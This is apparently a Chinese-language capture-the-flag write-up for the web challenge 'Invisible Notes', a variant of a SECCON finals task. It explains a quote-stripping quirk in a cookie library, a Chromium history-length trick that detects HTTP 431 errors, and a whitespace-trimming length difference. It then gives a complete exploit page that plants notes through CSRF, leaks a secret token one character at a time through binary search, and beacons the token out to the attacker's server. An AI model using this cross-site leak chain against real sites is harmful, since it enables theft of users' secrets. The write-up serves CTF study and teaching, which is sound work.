# Invisible Notes

> 本题基于Slay the Note，但是现在笔记看不见了
> https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202603_SECCON_CTF_14_Finals/web/slay-the-note

很有用的blog:

```txt
https://nanimokangaeteinai.hateblo.jp/entry/2026/03/02/235931#%E7%AB%B6%E6%8A%80%E6%99%82%E9%96%93%E4%B8%AD%E3%81%AB%E3%81%AF%E8%A7%A3%E3%81%91%E3%81%9A-Web-500-Slay-the-Note-0-solves
https://blog.arkark.dev/2025/12/26/etag-length-leak
```

看了两篇文章，学到了很多，但是还是利用不起来

### st98的思路

注意到在添加分号作为笔记的时候前端会显示`Internal Server Error`

进入docker容器查看会发现奇怪的报错

```txt
TypeError: argument value is invalid
      at new Cookie (/app/node_modules/cookies/index.js:158:11)
      at Cookies.set (/app/node_modules/cookies/index.js:117:16)
      at file:///app/index.js:38:15
      at dispatch (/app/node_modules/koa-compose/index.js:42:32)
      at bodyParser (file:///app/node_modules/@koa/bodyparser/dist/index.mjs:136:12)
      at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
```

这个错误并不是问题的核心（但也提醒我们之后无法利用分号的隔断进行xsleak），但是st98通读了处理cookie的源码，发现了更加关键的代码

```
https://github.com/pillarjs/cookies/blob/3274e7dd3afc93e13707ef2ed3d43d84c39cf213/index.js
```

```js
if (value[0] === '"') value = value.slice(1, -1)
```

如果 cookie 值的第一个字符是 `"` ，无论最后一个字符是什么，它都会从开头和结尾各删除一个字符。这就让控制cookie的长度成为了可能。

比如先输入`|"`，此时没有什么变化

```txt
notes=<article>|"</article>;
["<article>","\"</article>"]  # 这个地方"被转义为了\"
```

再输入a，就完成了切割

/new中还是`notes="</article>|<article>|<article>a</article>;`

回到主页面中cookie已经变成了`notes=</article>|<article>|<article>a</article;`

```txt
["</article>","<article>","<article>a</article"]
```

### Ark的思路

主要是学习非预期的xsleak思路，利用431 oracle进行泄露。

`impossible-leak`原题是利用etag的长度变化，本题肯定是用cookie的长度变化，所以第一部分暂时跳过。

最精彩的是后面的部分。

许多网络服务器为了防止拒绝服务攻击，都会对请求头（包括请求行）的大小设置上限。如果请求超过此限制，服务器会返回`431 Request Header Fields Too Large`

和本题一样，Express 运行在 `node:http` 上，而 node:http 对请求头大小有限制 `http.maxHeaderSize` （默认值： `16 KiB` ）：`https://github.com/nodejs/node/blob/v25.2.1/src/node_options.h#L159`

```c
uint64_t max_http_header_size = 16 * 1024;
```

通过填充，使header的大小刚好达到阈值，再利用字节的差异造成200/431的差异。

但是如何检测431的错误仍然是一个很大的问题

通常情况下，跨域状态码是不透明的。但是，我们可以利用 Chromium 关于会话历史更新的特殊行为。

当发生导航时，浏览器通常会“推送”一个新的历史记录条目，将 `history.length` 增加 1。但是，Chromium 有时会“替换”当前条目，而不是推送一个新的条目。

Chromium 使用 `should_replace_current_entry` 来决定是“推送”还是“替换”。导致“替换”的一种情况是，导航到同一 URL 失败（ `page_state` 无效）。

因此，如果我们连续两次访问同一个 URL，并且第二次访问由于 431 错误而失败，则这**两次**访问只会贡献**一个**新历史记录条目（因为第二次访问替换了第一次访问）。

这意味着我们可以通过测量我们控制的窗口上的 `history.length` 来检测 431。

```js
const got431 = async (prefix, padLength) => {
  await prepare(prefix);

  const nonce = (Math.random() + "").padEnd(20, "0");
  const url = getUrl(prefix, padLength, nonce);

  const len1 = win.history.length;

  win.location = url;
  await sleep(100);
  win.location = url;
  await sleep(100);
  win.location = "about:blank";
  await sleep(100);
  const len2 = win.history.length;

  const diff = len2 - len1;
  // If a 431 error occurs: diff === 2
  // Otherwise: diff === 3

  console.log({ prefix, len1, len2, diff });
  return diff === 2;
};
```

### 本题思路

比赛的时候并没有什么思路，因为觉得双引号无法产生差异，赛后和出题学长的交流给了我另外一种思路，放弃双引号的特性转而使用巧妙的空格差异

具体来说就是使用浏览器 Set-Cookie 时消除前后空格的特性

> https://www.rfc-editor.org/info/rfc6265/#section-5.2

比如我们构造这样一个 note ：

```txt
TOKEN_a |
```

cookie会变成：

```txt
<article>TOKEN_a |</article>
```

再新建一个note，触发 `split("|") + sort()`。此时就能构造两种情况：

* token < TOKEN_a:

  ```txt
  <article>TOKEN_9f</article>|<article>TOKEN_a 
  ```

  末尾是空格，浏览器 Set-Cookie 会去掉首尾空格，长度: 44

* token > TOKEN_a

  ```txt
  <article>TOKEN_a |<article>TOKEN_a0</article>
  ```

  尾部空格在中间，只去掉了首空格，长度: 45

于是就产生了一个字节的长度差异，可以利用请求头的大小进行 431 oracle

```js
createNote(`${guess} |`)
createNote("")
```

Chromium 的单 Cookie 还有 4096 字节限制，如果用比较朴素的线性可能导致长度问题，所以需要二分查找。

```js
const leakNextChar = async () => {
  let left = 0;
  let right = CHARS.length - 1;
  let next = CHARS[0];
  let firstFalse = CHARS[CHARS.length - 1];

  while (left <= right) {
    const mid = (left + right) >> 1;
    const guess = known + CHARS[mid];

    if (await realGreaterThanGuess(guess)) {
      next = CHARS[mid];
      left = mid + 1;
    } else {
      firstFalse = CHARS[mid];
      right = mid - 1;
      if (left <= right || known.length + 1 < TOKEN_LEN) {
        await cleanupFalseGuess();
      }
    }
  }
  return next;
};
```

当然，还有很多关键的细节问题需要注意，比如利用双引号的特性清除落在真实token右侧的错误猜测，从而能够让后面猜测的空格到达最末端产生差异，这里的12是考虑到TOKEN后面的长度，去掉12位之后就能够通过sort回到真实token的前面。其实也可以动态调整，但是会更加麻烦。

引入清理笔记：

```js
await createNote(`|${'"'.repeat(q)}`);
```

经过包装和 sanitize 后是：

```html
<article>|""""...</article>
```

长度为`q + 20`，把这条笔记拼入 Cookie 时，还会增加一个分隔符，变为`q + 21`

第二条空笔记一样：

```html
|<article></article>
```

所以，在开始删除之前，Cookie 总增长量为：`(q + 21) + 20 = q + 41`

加入空笔记并排序以后，引号片段因为 `"` 的 ASCII 排序位置较小，会移动到 Cookie 最前面：

```html
""""""""""""</article>|...
```

只要 Cookie 仍以 `"` 开头，解析时就会执行：

```js
value = value.slice(1, -1);
```

Cookie 的净增长量 = 临时增长 - 裁剪量 = `(q + 41) - 2q = 41 - q`

所以当我们想要裁剪后12位的时候

```js
const CLEANUP_QUOTES = 12;
const CLEANUP_INCREASE = 29;
```

```js
const visitRoot = async () => {
  open(`${BASE_URL}/?r=${Math.random()}`, "csrf");
  await sleep(180);
};

const CLEANUP_QUOTES = 12;
const CLEANUP_INCREASE = 29;

const cleanupFalseGuess = async () => {
  await createNote(`|${'"'.repeat(CLEANUP_QUOTES)}`);
  await createNote("");
  for (let i = 0; i < CLEANUP_QUOTES; i++) {
    await visitRoot();
  }
  safePad -= CLEANUP_INCREASE;
  debug({ type: "cleanup", safePad });
};
```

把上述这些合并起来就能形成最终利用的html

```html
<body>
  <form id="create" action="..." method="post" target="csrf">
    <input type="text" name="note" />
  </form>
  <script type="module">
    const BASE_URL = "http://web:3000";
    const CHARS = [..."0123456789abcdef"];
    const TOKEN_LEN = "TOKEN_".length + 12;

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    const debug = (o) => navigator.sendBeacon("/debug", JSON.stringify(o));

    const knownParam = new URLSearchParams(location.search).get("known");
    let known = knownParam?.startsWith("TOKEN_") ? knownParam : "TOKEN_";

    open("about:blank", "csrf");

    const createNote = async (note) => {
      const form = document.forms[0];
      form.method = "post";
      form.action = `${BASE_URL}/new`;
      form.note.value = note;
      form.submit();
      await sleep(180);
    };

    const visitRoot = async () => {
      open(`${BASE_URL}/?r=${Math.random()}`, "csrf");
      await sleep(180);
    };

    const prepared = new Set();
    let safePad = 0;

    const prepareCompare = async (guess) => {
      if (prepared.has(guess)) return;
      prepared.add(guess);

      await createNote(`${guess} |`);
      await createNote("");
    };

    const CLEANUP_QUOTES = 12;
    const CLEANUP_INCREASE = 29;

    const cleanupFalseGuess = async () => {
      await createNote(`|${'"'.repeat(CLEANUP_QUOTES)}`);
      await createNote("");
      for (let i = 0; i < CLEANUP_QUOTES; i++) {
        await visitRoot();
      }
      safePad -= CLEANUP_INCREASE;
      debug({ type: "cleanup", safePad });
    };

    // The following 431 oracle is based on https://blog.arkark.dev/2025/12/26/etag-length-leak

    let win = open("about:blank");

    const getUrl = (label, padLength, nonce) =>
      `${BASE_URL}/?${new URLSearchParams({
        q: label,
        pad: nonce.padEnd(Math.max(0, padLength), "x"),
      })}`;

    const detect431 = async (label, padLength) => {
      const nonce = (Math.random() + "").padEnd(20, "0");
      const url = getUrl(label, padLength, nonce);
      const len1 = win.history.length;

      win.location = url;
      await sleep(120);
      win.location = url;
      await sleep(120);
      win.location = "about:blank";
      await sleep(120);

      const len2 = win.history.length;
      const diff = len2 - len1;

      if (len2 > 45) {
        win.close();
        win = open("about:blank");
        await sleep(120);
      }

      debug({ type: "detect", label, padLength, len1, len2, diff });
      return diff === 2;
    };

    const getSafePad = async (label) => {
      // Re-calibrate every time because previous probes keep growing the cookie.
      let left = 10_000;
      let right = 18_000;

      while (!(await detect431(label, right))) right += 1_000;
      while (await detect431(label, left)) left -= 1_000;

      while (right - left > 1) {
        const mid = (right + left) >> 1;
        if (await detect431(label, mid)) {
          right = mid;
        } else {
          left = mid;
        }
      }
      return left;
    };

    const shortIncrease = (guess) => {
      // sanitize(`<article>${guess} |</article>`)
      return guess.length + 41;
    };

    const realGreaterThanGuess = async (guess, updateSafePad = true) => {
      const increase = shortIncrease(guess);

      await prepareCompare(guess);

      const pad = safePad - increase;
      const result = await detect431(guess, pad);
      debug({ type: "oracle", guess, safePad, increase, pad, result });
      if (updateSafePad) {
        safePad -= increase + (result ? 1 : 0);
      }
      return result;
    };

    const leakNextChar = async () => {
      let left = 0;
      let right = CHARS.length - 1;
      let next = CHARS[0];
      let firstFalse = CHARS[CHARS.length - 1];

      while (left <= right) {
        const mid = (left + right) >> 1;
        const guess = known + CHARS[mid];

        if (await realGreaterThanGuess(guess)) {
          next = CHARS[mid];
          left = mid + 1;
        } else {
          firstFalse = CHARS[mid];
          right = mid - 1;
          if (left <= right || known.length + 1 < TOKEN_LEN) {
            await cleanupFalseGuess();
          }
        }
      }
      return next;
    };

    const main = async () => {
      debug({ type: "start", known });

      while (known.length < TOKEN_LEN) {
        safePad = await getSafePad(`${known}g`);
        debug({ type: "calibrate", known, safePad });
        const next = await leakNextChar();
        known += next;
        safePad -= 1;
        navigator.sendBeacon("/leak", known);
        debug({ type: "known", known });
      }

      navigator.sendBeacon("/flag", known);
    };

    main().catch((e) => {
      debug({
        type: "error",
        message: String(e),
        stack: e?.stack,
      });
    });
  </script>
</body>
```

比较遗憾的是，本地测试成功，远程还是遇到很多问题。无论如何，核心的逻辑是一致的。

![屏幕截图 2026-06-18 190524](./images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-06-18%20190524.png)

